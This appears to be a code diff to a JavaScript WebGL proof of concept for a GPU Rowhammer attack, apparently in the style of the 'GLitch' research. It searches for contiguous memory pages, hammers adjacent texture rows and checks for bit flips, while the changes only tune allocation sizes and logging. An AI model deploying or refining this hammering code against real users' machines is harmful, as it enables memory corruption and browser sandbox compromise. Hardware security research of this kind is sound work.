@@ -7,19 +7,23 @@ async function glitch() {
     initGL();
     initFramebuffer();
     
-    allocatePages(PAGES_PER_MB * 64);
-    const allocator = new Allocator(PAGES_PER_MB * 128);
+    allocatePages(PAGES_PER_MB * 32);
+    const allocator = new Allocator(PAGES_PER_MB * 192);
     await allocator._init(0);
-
     const contPages = allocator.SearchContPages();
+    // const contPages = mockContPages(5)
+
     console.log(`++ ${contPages.length} continuous pages found`);
     
     // enable shaders too be used
     shader = new Shader('vertex-shader', 'fragment-shader');
     shader.use();
 
+    let hammered = 0;
     for (let cont of contPages) {
+        console.log(`++ Starting Hammering ContBlock ${hammered}`)
         hammerTime(cont);
+        hammered += 1;
     }
 
     // debug with framebuffer (view texture contents)
@@ -41,12 +45,12 @@ function hammerTime(contMem) {
 
     // hammer row 0 and row 1
     for (let row = 0; row <= 16; row += 16) {
-        console.log(`++ Prepare row [${row/16}]`);
+        console.log(`++ Prepare row [${row/16}] for hammer.`);
 
         // hammer every bank in a row
         for (let localOffset = 0; localOffset < 16; localOffset += 2) {
             let offset = row + localOffset;
-            console.log(`+++ Prepare bank [${offset}] [${offset + 1}]`);
+            // console.log(`+++ Prepare bank [${offset}] [${offset + 1}]`);
 
 
             // fill textures in row n-1, n+1 with 0
@@ -95,9 +99,9 @@ function hammerTime(contMem) {
             }
 
             // hammer textures
-            console.log(`+++ Hammering bank [${offset}] [${offset + 1}]`);
+            // console.log(`+++ Hammering bank [${offset}] [${offset + 1}]`);
             gl.drawArrays(gl.POINTS, 0, 1);
-            console.log(`+++ Hammering bank [${offset}] [${offset + 1}] done`);
+            // console.log(`+++ Hammering bank [${offset}] [${offset + 1}] done`);
 
             // check hammered textures for bit flip
             checkForFlip(contMem[offset + 16].texture, offset+16);
